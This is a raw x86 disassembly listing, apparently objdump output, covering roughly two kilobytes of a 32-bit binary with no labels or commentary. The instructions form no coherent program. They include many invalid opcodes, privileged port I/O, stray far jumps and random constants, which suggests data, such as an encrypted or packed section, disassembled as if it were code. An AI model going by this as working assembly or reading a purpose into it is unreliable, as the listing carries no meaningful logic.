  4066c9:	push   edx
  4066ca:	xor    BYTE PTR [ebx+esi*2-0x762e5b2],0x50
  4066d2:	sbb    DWORD PTR [ebp-0xf15ec13],edi
  4066d8:	mov    ah,0xf9
  4066da:	sbb    ebp,ebp
  4066dc:	les    eax,FWORD PTR [edi+0x7]
  4066df:	int3   
  4066e0:	cdq    
  4066e1:	mov    cl,0x67
  4066e3:	push   es
  4066e4:	cmp    al,0xa5
  4066e6:	inc    ecx
  4066e7:	aas    
  4066e8:	inc    edx
  4066e9:	mov    dl,0xbd
  4066eb:	sti    
  4066ec:	ret    
  4066ed:	or     ebx,DWORD PTR [eax]
  4066ef:	loop   0x406736
  4066f1:	int    0xe9
  4066f3:	or     al,0x75
  4066f5:	mov    BYTE PTR [edi-0x11],0x2c
  4066f9:	fsubr  QWORD PTR [ecx+edi*2]
  4066fc:	xor    eax,0xe1117ae3
  406701:	lea    ebp,[ebx+0x6a]
  406704:	mov    ch,BYTE PTR [edi+0x4cdae847]
  40670a:	add    BYTE PTR [eax-0x7c],dl
  40670d:	cld    
  40670e:	mov    ch,0xc8
  406710:	test   DWORD PTR [esi+0x12900353],ecx
  406716:	inc    esi
  406717:	fistp  WORD PTR [esi+0x6b]
  40671a:	xchg   ebp,eax
  40671b:	ds sahf 
  40671d:	jbe    0x40671a
  40671f:	and    eax,0x11cc4fa7
  406724:	dec    ebx
  406725:	jp     0x40676d
  406727:	inc    edx
  406728:	icebp  
  406729:	imul   ebx,DWORD PTR [eax+edi*4-0x1acd6063],0xffffffc5
  406731:	clc    
  406732:	push   esp
  406733:	mov    ecx,0xda9f00d7
  406738:	add    eax,0x527a401b
  40673d:	repnz xor al,0x77
  406740:	add    ebx,DWORD PTR [ebp-0x16]
  406743:	mov    bh,0xb9
  406745:	or     ecx,DWORD PTR [eax+0x2ff3cbf7]
  40674b:	mov    esp,0x39a74c50
  406750:	lea    edx,[edi+0x64]
  406753:	push   edi
  406754:	dec    ebp
  406755:	sub    eax,0x891c8727
  40675a:	popa   
  40675b:	repnz add ebp,esp
  40675e:	les    esi,FWORD PTR [esi+0x49]
  406761:	out    dx,al
  406762:	push   cs
  406763:	pop    ecx
  406764:	frstor [edx-0x80]
  406767:	sub    ah,BYTE PTR [ebp-0x53891b33]
  40676d:	sti    
  40676e:	lahf   
  40676f:	mov    cl,0x82
  406771:	nop
  406772:	push   ss
  406773:	jg     0x4067bd
  406775:	jg     0x4067be
  406777:	mov    esi,0x171c9ab8
  40677c:	mov    BYTE PTR [eax],bh
  40677e:	xchg   edx,ebx
  406780:	pop    esi
  406781:	out    0x62,eax
  406783:	les    edi,FWORD PTR [edx+0xf]
  406786:	lods   al,BYTE PTR ds:[esi]
  406787:	mov    cl,0x68
  406789:	nop
  40678a:	xor    eax,0x6511536a
  40678f:	outs   dx,DWORD PTR ds:[esi]
  406790:	loopne 0x40676c
  406792:	push   ds
  406793:	jg     0x4067f3
  406795:	mov    bh,al
  406797:	push   ebp
  406798:	leave  
  406799:	sbb    ah,BYTE PTR [edx+0x57]
  40679c:	scas   eax,DWORD PTR es:[edi]
  40679d:	dec    esp
  40679e:	dec    ebp
  40679f:	popa   
  4067a0:	mov    ?,ecx
  4067a2:	dec    ebp
  4067a3:	or     al,0xaa
  4067a5:	sbb    esi,DWORD PTR [edx]
  4067a7:	fnsave [esi]
  4067a9:	pop    ds
  4067aa:	sub    BYTE PTR [edx+esi*4+0x6df0556d],cl
  4067b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067b2:	jle    0x40678b
  4067b4:	fist   WORD PTR [ecx+0x25]
  4067b7:	jb     0x406742
  4067b9:	std    
  4067ba:	popa   
  4067bb:	fsubr  QWORD PTR [eax+0x5e7dad31]
  4067c1:	ja     0x406771
  4067c3:	ror    BYTE PTR [edx],1
  4067c5:	add    ecx,ebp
  4067c7:	sub    DWORD PTR [ebp-0x3feacd90],ecx
  4067cd:	bound  eax,QWORD PTR [esp+eax*8]
  4067d0:	sub    eax,0xf746aba0
  4067d5:	in     al,dx
  4067d6:	jnp    0x4067dc
  4067d8:	pop    esp
  4067d9:	mov    edi,0x9fbba8b
  4067de:	pop    ebx
  4067df:	cwde   
  4067e0:	add    eax,0x806324b3
  4067e5:	cmp    esp,DWORD PTR [edx+0x68]
  4067e8:	bound  ebx,QWORD PTR [edi]
  4067ea:	mov    al,0xa0
  4067ec:	pushf  
  4067ed:	jmp    0x64e:0x569f06e7
  4067f4:	(bad)  
  4067f5:	cmp    eax,0x601c7330
  4067fa:	std    
  4067fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067fc:	inc    ebp
  4067fd:	call   0x7a982e4
  406802:	adc    edi,esp
  406804:	out    0x64,eax
  406806:	sub    eax,0x8656c4fe
  40680b:	or     esp,ebp
  40680d:	jp     0x4067c0
  40680f:	arpl   WORD PTR [esi],di
  406811:	imul   BYTE PTR [ebx-0x1e]
  406814:	or     edx,eax
  406816:	add    ebp,ebp
  406818:	inc    eax
  406819:	retf   0x468f
  40681c:	sar    BYTE PTR [eax+eiz*1-0x40bcc23d],cl
  406823:	out    0x36,al
  406825:	jmp    0x4067ee
  406827:	inc    ebx
  406828:	je     0x406883
  40682a:	sar    BYTE PTR ds:0xd0d382d7,0xe0
  406831:	jns    0x406897
  406833:	push   edi
  406834:	inc    esi
  406835:	aas    
  406836:	ret    0xb7c6
  406839:	jb     0x4067cc
  40683b:	mov    ds:0xa7f45d16,eax
  406840:	ss push ecx
  406842:	in     eax,0xf6
  406844:	xchg   edi,eax
  406845:	add    eax,ebx
  406847:	mov    ebx,0x11b3cd34
  40684c:	cwde   
  40684d:	sub    DWORD PTR [eax],ebp
  40684f:	xchg   BYTE PTR [eax+ebx*2+0x31],bl
  406853:	cdq    
  406854:	lahf   
  406855:	fidivr WORD PTR [edx+ecx*8+0x19]
  406859:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40685a:	mov    ch,bh
  40685c:	stos   BYTE PTR es:[edi],al
  40685d:	out    0xfe,al
  40685f:	xchg   edx,eax
  406860:	stc    
  406861:	int3   
  406862:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406863:	dec    edx
  406864:	enter  0xf511,0xf2
  406868:	adc    BYTE PTR [ebp-0x76],cl
  40686b:	mov    eax,ds:0x13789b94
  406870:	cli    
  406871:	(bad)  [edi-0x122f6ce9]
  406877:	jns    0x406886
  406879:	mov    eax,DWORD PTR [eax+0x30]
  40687c:	and    al,0x11
  40687e:	push   es
  40687f:	cmp    DWORD PTR [ecx-0x1bbb7041],eax
  406885:	lock add DWORD PTR [edx+edx*8+0x58],edi
  40688a:	sti    
  40688b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40688c:	(bad)  
  40688d:	jnp    0x406896
  40688f:	inc    esi
  406890:	adc    BYTE PTR [ecx+0x19],0xdf
  406894:	xlat   BYTE PTR ds:[ebx]
  406895:	ret    
  406896:	fmul   DWORD PTR [esi-0x79247857]
  40689c:	xor    DWORD PTR [edi-0x37cd1833],esp
  4068a2:	mov    cl,0x46
  4068a4:	jne    0x40691a
  4068a6:	in     eax,0xbb
  4068a8:	clc    
  4068a9:	int    0x7c
  4068ab:	push   0xffffffca
  4068ad:	jge    0x4068c7
  4068af:	mov    BYTE PTR [edi],al
  4068b1:	sub    eax,0x3f20fb41
  4068b6:	ds (bad) 
  4068b8:	mov    esi,0x46708054
  4068bd:	mov    ebx,0x7b008b7b
  4068c2:	xlat   BYTE PTR ds:[ebx]
  4068c3:	or     eax,0xc6e1751f
  4068c8:	xor    dh,BYTE PTR [ebx+0x14448cd3]
  4068ce:	lock push ebp
  4068d0:	rol    DWORD PTR [ebx],0x65
  4068d3:	pop    edi
  4068d4:	out    0x85,eax
  4068d6:	loop   0x406927
  4068d8:	(bad)  
  4068d9:	jno    0x406928
  4068db:	pop    edi
  4068dc:	test   al,0x80
  4068de:	lds    ebp,FWORD PTR [ecx]
  4068e0:	adc    al,0x6c
  4068e2:	and    eax,0xd1956289
  4068e7:	mov    ah,0xc2
  4068e9:	xchg   ebx,eax
  4068ea:	jecxz  0x406886
  4068ec:	test   DWORD PTR [edx+edx*2+0x6b6b5834],edi
  4068f3:	mov    esp,0x91721c95
  4068f8:	sbb    edx,DWORD PTR [esi+0x7f2e6723]
  4068fe:	pop    es
  4068ff:	pmovmskb ebx,mm4
  406902:	mov    edi,DWORD PTR [eax]
  406904:	retf   0x6761
  406907:	sub    eax,DWORD PTR [esi]
  406909:	dec    edx
  40690a:	clc    
  40690b:	xor    BYTE PTR [ebx-0x2bc975c7],dl
  406911:	xchg   edx,eax
  406912:	rol    DWORD PTR ds:0x3cbe5fd9,0xff
  406919:	xchg   DWORD PTR [ebx-0x59],esi
  40691c:	xchg   ecx,eax
  40691d:	shl    BYTE PTR [ebp+edi*8+0x565a8951],cl
  406924:	outs   dx,DWORD PTR ds:[esi]
  406925:	push   ebx
  406926:	xchg   esi,eax
  406927:	mov    dl,0x2
  406929:	adc    ebp,0x63
  40692c:	stos   BYTE PTR es:[edi],al
  40692d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40692e:	lods   al,BYTE PTR ds:[esi]
  40692f:	mov    esi,0xbb2b2ec5
  406934:	sub    al,0x3b
  406936:	mov    ss,WORD PTR [ebp+0x3f56102b]
  40693c:	pusha  
  40693d:	je     0x406936
  40693f:	push   edi
  406940:	push   esp
  406941:	jle    0x4068ea
  406943:	or     al,0x9b
  406945:	mov    ds:0x57c7050a,al
  40694b:	pop    edx
  40694c:	jle    0x40692e
  40694e:	out    0xfe,al
  406950:	cmp    BYTE PTR [ecx+0x48],ah
  406953:	leave  
  406954:	dec    ebx
  406955:	inc    edi
  406956:	stc    
  406957:	pop    ecx
  406958:	pusha  
  406959:	cmp    eax,0x3d722b3a
  40695e:	pop    edi
  40695f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406960:	dec    ebp
  406961:	dec    esp
  406962:	jle    0x4068fb
  406964:	out    dx,eax
  406965:	jo     0x40693e
  406967:	mov    cl,ah
  406969:	out    0x6c,eax
  40696b:	ss mov cl,0x67
  40696e:	mov    eax,ds:0x12cbbdfc
  406973:	or     DWORD PTR [ecx-0x6ffe3349],ebx
  406979:	fisub  WORD PTR [eax]
  40697b:	adc    eax,0x4f6803c9
  406980:	push   edi
  406981:	popf   
  406982:	pop    eax
  406983:	mov    ds:0x54005af2,al
  406988:	and    eax,0x9f38745
  40698d:	mov    esp,0x4cc494b0
  406992:	push   ecx
  406993:	lock sbb bh,dl
  406996:	push   esp
  406997:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406998:	fdiv   QWORD PTR [ecx+0x1d]
  40699b:	pop    ds
  40699c:	mov    bh,0xe5
  40699e:	test   eax,0x1c0179fa
  4069a3:	inc    eax
  4069a4:	(bad)  
  4069a5:	adc    eax,0xdd939359
  4069aa:	das    
  4069ab:	addr16 mov al,ds:0x1b82
  4069af:	shr    BYTE PTR [ebx-0x59a791a0],cl
  4069b5:	lahf   
  4069b6:	(bad)  
  4069b8:	jb     0x4069ef
  4069ba:	mov    eax,0xea176472
  4069bf:	xor    al,0x69
  4069c1:	ja     0x4069c2
  4069c3:	jo     0x4069d2
  4069c5:	jmp    DWORD PTR [ebx]
  4069c7:	mov    ecx,0xfd222ddf
  4069cc:	fstp   st(0)
  4069ce:	pop    eax
  4069cf:	jmp    0x406a49
  4069d1:	(bad)  
  4069d3:	lahf   
  4069d4:	xor    ebp,ecx
  4069d6:	push   es
  4069d7:	or     DWORD PTR [ebp-0x6],0x1f
  4069db:	dec    ecx
  4069dc:	sub    al,0x98
  4069de:	or     DWORD PTR [ebx+edi*8+0x3701d7d0],0xffffffbd
  4069e6:	repz mov esp,0x1af47bd
  4069ec:	(bad)  
  4069ed:	call   0x91b5584
  4069f2:	loopne 0x4069c6
  4069f4:	mov    dh,0x9e
  4069f6:	fst    DWORD PTR [esi-0x4959b31e]
  4069fc:	cmp    BYTE PTR [esi+ecx*4-0x8f35742],cl
  406a03:	push   0xe9888069
  406a08:	enter  0x9a94,0x30
  406a0c:	pop    ss
  406a0d:	iret   
  406a0e:	jns    0x4069ba
  406a10:	sahf   
  406a11:	sbb    al,bh
  406a13:	mov    ebx,0x562f9522
  406a18:	ss mov dh,0x3d
  406a1b:	pop    ds
  406a1c:	fs cli 
  406a1e:	push   0x43
  406a20:	ficomp DWORD PTR [ebx-0x31]
  406a23:	mov    ecx,0xc8e3b6d9
  406a28:	aad    0xaa
  406a2a:	mov    ds:0xd1d28c8b,eax
  406a2f:	loop   0x406aaa
  406a31:	dec    esp
  406a32:	xchg   ebx,eax
  406a33:	mov    fs,WORD PTR [edx+0x34]
  406a36:	cld    
  406a37:	pop    es
  406a38:	stos   DWORD PTR es:[edi],eax
  406a39:	push   ecx
  406a3a:	pop    ecx
  406a3b:	lds    ebp,FWORD PTR [ebx+0x6d36b619]
  406a41:	inc    ebx
  406a42:	and    al,0xc1
  406a44:	out    dx,al
  406a45:	add    DWORD PTR [edx+0x508094a0],esp
  406a4b:	sub    eax,0xdb23229e
  406a50:	sbb    BYTE PTR [esi-0x31],0xbd
  406a54:	addr16 std 
  406a56:	push   es
  406a57:	popa   
  406a58:	ret    0xeeac
  406a5b:	pushf  
  406a5c:	ins    BYTE PTR es:[edi],dx
  406a5d:	jbe    0x406a11
  406a5f:	shl    DWORD PTR [edx-0x35c9aa60],1
  406a65:	pop    esp
  406a66:	or     BYTE PTR [edi+0x16],bl
  406a69:	sub    eax,0xc07d426b
  406a6e:	and    DWORD PTR [edx+0x49],edi
  406a71:	mov    edx,0x1151351
  406a76:	jns    0x406a0b
  406a78:	pop    ss
  406a79:	xlat   BYTE PTR ds:[ebx]
  406a7a:	xchg   BYTE PTR [ebx+0x63],dl
  406a7d:	dec    esp
  406a7e:	pop    edx
  406a7f:	mov    edi,0x84d5043
  406a84:	stc    
  406a85:	fwait
  406a86:	inc    ecx
  406a87:	outs   dx,BYTE PTR ds:[esi]
  406a88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a89:	jmp    0x2d21:0x9bcebda5
  406a90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a91:	and    al,BYTE PTR [ebx+eiz*8]
  406a94:	jo     0x406a56
  406a96:	jb     0x406a27
  406a98:	loop   0x406a71
  406a9a:	pop    eax
  406a9b:	cmc    
  406a9c:	int3   
  406a9d:	lods   eax,DWORD PTR ds:[esi]
  406a9e:	ror    DWORD PTR [ebx+0x60],0x32
  406aa2:	sbb    eax,0x54bd9034
  406aa7:	xor    ebx,DWORD PTR [edx+ebp*4-0x2b]
  406aab:	sub    al,BYTE PTR [ebx-0x30746957]
  406ab1:	loopne 0x406af3
  406ab3:	fdiv   DWORD PTR [edx-0x13]
  406ab6:	add    BYTE PTR [eax+0x4],0xf5
  406aba:	shr    BYTE PTR [edx+0x3f549285],1
  406ac0:	mov    esp,DWORD PTR [ebp+0x2a6b7489]
  406ac6:	mov    eax,0x684a836d
  406acb:	retf   0x1d55
  406ace:	int3   
  406acf:	inc    edx
  406ad0:	stos   DWORD PTR es:[edi],eax
  406ad1:	sbb    eax,DWORD PTR [esi+0x48]
  406ad4:	mov    ah,0x98
  406ad6:	cld    
  406ad7:	leave  
  406ad8:	and    BYTE PTR [eax+0x18],al
  406adb:	xor    esp,DWORD PTR [ecx]
  406add:	inc    ecx
  406ade:	dec    ebp
  406adf:	jg     0xfc7bd42e
  406ae5:	and    cl,dh
  406ae7:	mov    DWORD PTR [edx+0x70],edx
  406aea:	add    al,0x7b
  406aec:	sub    ecx,DWORD PTR [esi]
  406aee:	ss pop esp
  406af0:	repz aas 
  406af2:	jo     0x406b40
  406af4:	repnz lock add ah,BYTE PTR [edx+0x699f869c]
  406afc:	test   bh,ch
  406afe:	cmp    al,0xa1
  406b00:	sub    bh,dh
  406b02:	(bad)  
  406b03:	mov    esp,0xb8a70c31
  406b08:	shl    DWORD PTR [edi-0x57],0xde
  406b0c:	scas   eax,DWORD PTR es:[edi]
  406b0d:	push   esi
  406b0e:	dec    ch
  406b10:	addr16 fwait
  406b12:	into   
  406b13:	out    0x5b,al
  406b15:	std    
  406b16:	call   0xad475544
  406b1b:	cmp    ebx,edx
  406b1d:	xor    DWORD PTR [ecx+0x241633ed],0xffffffd6
  406b24:	fst    DWORD PTR [ebx-0x58c55c05]
  406b2a:	dec    edi
  406b2b:	sub    BYTE PTR ds:0xa43c376f,al
  406b31:	jge    0x406b98
  406b33:	mul    DWORD PTR [edx-0x1c]
  406b36:	cli    
  406b37:	fwait
  406b38:	mov    edi,0x8faf73d3
  406b3d:	adc    BYTE PTR ss:[esi-0x6d],cl
  406b41:	pop    ebx
  406b42:	ret    0x73b1
  406b45:	mov    ebx,0xc095d609
  406b4a:	cmp    edi,ebp
  406b4c:	test   al,0x51
  406b4e:	sub    al,0xa6
  406b50:	dec    esi
  406b51:	sbb    DWORD PTR [ebx+ecx*8-0x18],ecx
  406b55:	mov    BYTE PTR [esi+0x20],al
  406b58:	les    ebx,FWORD PTR [edx-0x7a37ca3b]
  406b5e:	sbb    esi,ebp
  406b60:	mov    ebp,ebx
  406b62:	xchg   dx,ax
  406b64:	ss pop ebp
  406b66:	inc    edx
  406b67:	mov    dl,0x52
  406b69:	sbb    ah,BYTE PTR [ecx]
  406b6b:	add    dh,BYTE PTR [ecx+edi*4]
  406b6e:	add    DWORD PTR [edi+ecx*1],edi
  406b71:	pusha  
  406b72:	fnstsw WORD PTR [esi-0x51]
  406b75:	and    al,0xd0
  406b77:	dec    eax
  406b78:	mov    dh,0x45
  406b7a:	in     eax,dx
  406b7b:	int    0x52
  406b7d:	or     esp,DWORD PTR [edi+edi*2]
  406b80:	loope  0x406b74
  406b82:	into   
  406b83:	sbb    eax,0x5dc0326f
  406b88:	mov    al,ds:0xa3fceb18
  406b8d:	aad    0xae
  406b8f:	jmp    0xf1910a27
  406b94:	xor    eax,0x86d99d58
  406b99:	pop    es
  406b9a:	push   cs
  406b9b:	push   esi
  406b9c:	in     al,dx
  406b9d:	das    
  406b9e:	dec    eax
  406b9f:	pop    es
  406ba0:	fwait
  406ba1:	add    BYTE PTR [esi+0x28],dh
  406ba4:	xchg   ecx,eax
  406ba5:	out    dx,eax
  406ba6:	rep lods al,BYTE PTR ds:[esi]
  406ba8:	test   al,0x76
  406baa:	rcl    BYTE PTR [esi+0x49278a6a],1
  406bb0:	xlat   BYTE PTR ds:[ebx]
  406bb1:	repnz (bad) 
  406bb3:	loopne 0x406c0d
  406bb5:	dec    esp
  406bb6:	or     al,0xa0
  406bb8:	jns    0x406bc7
  406bba:	out    0xe0,al
  406bbc:	mov    ch,0xb7
  406bbe:	es ins BYTE PTR es:[edi],dx
  406bc0:	aas    
  406bc1:	mov    esp,0x2e6690e8
  406bc6:	cmp    al,0x2f
  406bc8:	and    al,0xa4
  406bca:	rcr    ch,0x61
  406bcd:	adc    ebp,DWORD PTR [ecx]
  406bcf:	fwait
  406bd0:	cmp    DWORD PTR [ecx+0x1210dfad],0x1c
  406bd7:	popf   
  406bd8:	jne    0x406c59
  406bda:	fistp  WORD PTR [eax]
  406bdc:	or     ebx,DWORD PTR [eax-0x37e1934d]
  406be2:	hlt    
  406be3:	sub    edx,DWORD PTR [eax+0x53517382]
  406be9:	stos   DWORD PTR es:[edi],eax
  406bea:	aaa    
  406beb:	jnp    0x406bd8
  406bed:	sar    DWORD PTR [ebx],0xbc
  406bf0:	cmp    bl,BYTE PTR [esp+esi*1+0x68c6e0cf]
  406bf7:	aad    0x58
  406bf9:	jno    0x406bee
  406bfb:	jmp    0xf918:0x6920c0ed
  406c02:	cwde   
  406c03:	enter  0x2b22,0xe2
  406c07:	fstp   TBYTE PTR [eax+0x27]
  406c0a:	cmp    bl,al
  406c0c:	push   ds
  406c0d:	mov    ebp,0x5f958e32
  406c12:	loop   0x406c4b
  406c14:	sub    edi,ebp
  406c16:	mov    esp,0x5bee6d81
  406c1b:	cld    
  406c1c:	pop    esp
  406c1d:	arpl   WORD PTR [ecx+0x69],di
  406c20:	jbe    0x406bc5
  406c22:	pop    ebp
  406c23:	lods   al,BYTE PTR ds:[esi]
  406c24:	lods   al,BYTE PTR ds:[esi]
  406c25:	(bad)  
  406c26:	(bad)  
  406c27:	cdq    
  406c28:	xchg   ebp,eax
  406c29:	fiadd  DWORD PTR [ebx-0x4c]
  406c2c:	cmp    eax,eax
  406c2e:	pop    edi
  406c2f:	dec    ecx
  406c30:	pop    ebp
  406c31:	sti    
  406c32:	add    al,0xf1
  406c34:	pop    ebx
  406c35:	or     dh,BYTE PTR [edx+esi*1]
  406c38:	sub    BYTE PTR [edx-0x52],al
  406c3b:	mov    dl,0xec
  406c3d:	das    
  406c3e:	mov    ecx,eax
  406c40:	jle    0x406c1b
  406c42:	or     eax,0x258cb6d
  406c47:	rol    DWORD PTR [ebx],cl
  406c49:	js     0x406cb5
  406c4b:	dec    esp
  406c4c:	sub    DWORD PTR [edi+0x0],edx
  406c4f:	repz jo 0x406c60
  406c52:	pop    ss
  406c53:	mov    edi,0x7ca4a32
  406c58:	mov    ebx,0x17bb7f3a
  406c5d:	adc    BYTE PTR [esi-0x570e4f90],al
  406c63:	xor    al,0x4b
  406c65:	dec    esp
  406c66:	jge    0x406cd3
  406c68:	add    eax,0xbc0244fc
  406c6d:	cmc    
  406c6e:	repz fldcw WORD PTR [ecx+0x51d54ae6]
  406c75:	sub    BYTE PTR [edi+0x42e621fc],ah
  406c7b:	sbb    edx,DWORD PTR [eax+edi*8+0x55]
  406c7f:	pop    eax
  406c80:	test   DWORD PTR [ebx+0x6885b8be],eax
  406c86:	hlt    
  406c87:	mov    dl,ch
  406c89:	dec    edi
  406c8a:	mov    cl,0x47
  406c8c:	lea    ebx,[edx+0x35]
  406c8f:	inc    ecx
  406c90:	mov    eax,0x60e892c3
  406c95:	sbb    eax,0xe94c9254
  406c9a:	push   ebp
  406c9b:	jg     0x406d0a
  406c9d:	adc    al,0x25
  406c9f:	mov    esp,DWORD PTR [ebx]
  406ca1:	rol    al,0x82
  406ca4:	cmp    BYTE PTR [edi],al
  406ca6:	(bad)  
  406ca7:	xor    BYTE PTR [ebx-0x76982775],ah
  406cad:	in     eax,dx
  406cae:	mov    eax,ds:0xa852bc4c
  406cb3:	sbb    ebp,0x30
  406cb6:	pop    ss
  406cb7:	cmp    eax,0x50beffd1
  406cbc:	aam    0x7c
  406cbe:	add    ebp,edx
  406cc0:	and    ebx,DWORD PTR [esi]
  406cc2:	ins    BYTE PTR es:[edi],dx
  406cc3:	lea    ecx,[edi-0x2b4f8bf5]
  406cc9:	push   ss
  406cca:	cmp    eax,0x6f1a6c88
  406ccf:	nop
  406cd0:	(bad)  
  406cd1:	icebp  
  406cd2:	sar    BYTE PTR [ecx+edx*8+0x7e3eeecf],1
  406cd9:	mov    DWORD PTR [edi],edi
  406cdb:	(bad)  
  406cdc:	fdiv   QWORD PTR [ebp+0x78c09733]
  406ce2:	aas    
  406ce3:	mov    al,ds:0x47446299
  406ce8:	fwait
  406ce9:	cmp    eax,0x55c3f8b2
  406cee:	push   es
  406cef:	xchg   esp,eax
  406cf0:	je     0x406d47
  406cf2:	mov    cs,WORD PTR [ebx]
  406cf4:	dec    edx
  406cf5:	call   0x94492bb7
  406cfa:	outs   dx,DWORD PTR ds:[esi]
  406cfb:	pop    ecx
  406cfc:	dec    esi
  406cfd:	dec    ecx
  406cfe:	sti    
  406cff:	test   BYTE PTR [ebx-0xe],cl
  406d02:	pop    ds
  406d03:	out    dx,eax
  406d04:	cmp    ebp,DWORD PTR [eax+ecx*8]
  406d07:	loopne 0x406d82
  406d09:	imul   DWORD PTR [edx+0x180d70be]
  406d0f:	aaa    
  406d10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d11:	xchg   edx,edi
  406d13:	and    ebx,ebp
  406d15:	inc    edi
  406d16:	lods   al,BYTE PTR ds:[esi]
  406d17:	test   al,0x7
  406d19:	xor    dh,BYTE PTR [edi]
  406d1b:	in     al,0xd2
  406d1d:	push   ebp
  406d1e:	inc    BYTE PTR [ebp+esi*8-0x24]
  406d22:	mov    eax,0xe57d4182
  406d27:	jo     0x406d3a
  406d29:	mov    ch,0xed
  406d2b:	ja     0x406d19
  406d2d:	stos   BYTE PTR es:[edi],al
  406d2e:	jno    0x406cfc
  406d30:	mov    ah,0x8f
  406d32:	icebp  
  406d33:	mov    bh,0x7
  406d35:	ins    BYTE PTR es:[edi],dx
  406d36:	in     al,0x2c
  406d38:	les    esi,FWORD PTR [esi-0x74]
  406d3b:	jg     0x406cca
  406d3d:	(bad)  
  406d3e:	retf   0x88f6
  406d41:	pop    es
  406d42:	adc    DWORD PTR [ebx+0x25f937e2],esi
  406d48:	aad    0xa3
  406d4a:	mov    bl,0xd4
  406d4c:	ret    
  406d4d:	ins    BYTE PTR es:[edi],dx
  406d4e:	(bad)  
  406d4f:	pop    ds
  406d50:	dec    esi
  406d51:	fs add eax,0xcd57a67c
  406d57:	sar    DWORD PTR [esi],0xa2
  406d5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d5b:	jno    0x406cf1
  406d5d:	fisttp WORD PTR [esi]
  406d5f:	jle    0x406d36
  406d61:	sahf   
  406d62:	mov    esp,DWORD PTR [ecx+0x64c8c5ae]
  406d68:	(bad)  
  406d69:	or     BYTE PTR [eiz*4+0x56b334c4],dh
  406d70:	imul   esp,DWORD PTR [edi],0x50894758
  406d76:	pop    eax
  406d77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d78:	dec    ebx
  406d79:	je     0x406d63
  406d7b:	scas   eax,DWORD PTR es:[edi]
  406d7c:	sbb    ebx,DWORD PTR [esi]
  406d7e:	mov    gs,WORD PTR [esi+0x569f02ba]
  406d84:	sbb    BYTE PTR [ecx],0xb9
  406d87:	and    DWORD PTR [esi+edi*1+0x435acdfd],ebp
  406d8e:	lds    eax,FWORD PTR [esi+esi*2+0xdffe219]
  406d95:	cli    
  406d96:	daa    
  406d97:	cmp    al,0xe2
  406d99:	in     al,dx
  406d9a:	mov    ah,cl
  406d9c:	xchg   ebp,eax
  406d9d:	mov    ch,0xa3
  406d9f:	and    esp,edx
  406da1:	scas   eax,DWORD PTR es:[edi]
  406da2:	mov    dh,0x82
  406da4:	mov    edi,edx
  406da6:	out    dx,eax
  406da7:	push   ebp
  406da8:	jno    0x406e13
  406daa:	xor    ebp,DWORD PTR [edi+0x7a]
  406dad:	jb     0x406d85
  406daf:	int    0x81
  406db1:	das    
  406db2:	xchg   esi,eax
  406db3:	sbb    eax,DWORD PTR [eax-0x6bcd29e4]
  406db9:	and    cl,bl
  406dbb:	scas   al,BYTE PTR es:[edi]
  406dbc:	test   BYTE PTR [ebp-0x53],ch
  406dbf:	pop    ds
  406dc0:	dec    esi
  406dc1:	xor    esp,DWORD PTR [esi+0x1c041c85]
  406dc7:	jae    0x406db9
  406dc9:	jne    0x406db4
  406dcb:	mov    bl,0xd6
  406dcd:	fsub   st(5),st
  406dcf:	pushf  
  406dd0:	scas   eax,DWORD PTR es:[edi]
  406dd1:	dec    ebx
  406dd2:	mul    BYTE PTR [ecx+0x1e2fc005]
  406dd8:	pop    eax
  406dd9:	aaa    
  406dda:	sub    eax,0xeb674d99
  406ddf:	enter  0x775,0xf1
  406de3:	jecxz  0x406def
  406de5:	scas   al,BYTE PTR es:[edi]
  406de6:	xor    BYTE PTR [eax],bh
  406de8:	xchg   edx,eax
  406de9:	fcom   DWORD PTR [ebp+0x39]
  406dec:	rcl    edi,1
  406dee:	mov    edx,0x37625dfb
  406df3:	push   es
  406df4:	scas   al,BYTE PTR es:[edi]
  406df5:	xor    DWORD PTR [esp+edx*4-0xd],0xffffff90
  406dfa:	mov    dh,0x10
  406dfc:	sbb    BYTE PTR ds:[ecx],0xa0
  406e00:	repz mov dl,0x10
  406e03:	add    al,0xd5
  406e05:	jge    0x406e08
  406e07:	mov    eax,ds:0x24b574a
  406e0c:	inc    eax
  406e0d:	pop    ebp
  406e0e:	retf   0x13e4
  406e11:	mov    esi,0x21da7579
  406e16:	jecxz  0x406e8c
  406e18:	test   edi,0x6e662cac
  406e1e:	dec    edi
  406e1f:	pushw  ds
  406e21:	xlat   BYTE PTR ds:[ebx]
  406e22:	mov    ss,WORD PTR [ecx+0x77]
  406e25:	mov    eax,ds:0x1a840dcf
  406e2a:	jge    0x406e15
  406e2c:	xchg   edx,eax
  406e2d:	jae    0x406e7c
  406e2f:	(bad)
  406e33:	mov    bl,BYTE PTR [edi-0x776053d6]
  406e39:	ret    
  406e3a:	jne    0x406dce
  406e3c:	sbb    al,BYTE PTR [esi]
  406e3e:	xor    edi,DWORD PTR [esi+ebx*2]
  406e41:	daa    
  406e42:	adc    edi,DWORD PTR [eax-0x1fe24b0d]
  406e48:	mov    al,0x58
  406e4a:	rcr    DWORD PTR [ecx+0x6610e98b],0x6a
  406e51:	fnstcw WORD PTR [edi+eax*8]
  406e54:	pop    eax
  406e55:	jecxz  0x406ea4
  406e57:	cld    
  406e58:	sbb    ch,BYTE PTR [ebx]
  406e5a:	mov    ebx,0x7dfff47a
  406e5f:	aaa    
  406e60:	les    ebx,FWORD PTR ds:0x2e4a71b7
  406e66:	and    DWORD PTR [edx],edi
  406e68:	push   esi
  406e69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e6a:	jmp    0xd8c4754f
  406e6f:	push   ebx
  406e70:	retf   
  406e71:	out    0x4c,eax
  406e73:	inc    ebx
  406e74:	mov    DWORD PTR [ebx+0x22],0x70d013cb
  406e7b:	inc    ebp
  406e7c:	inc    edi
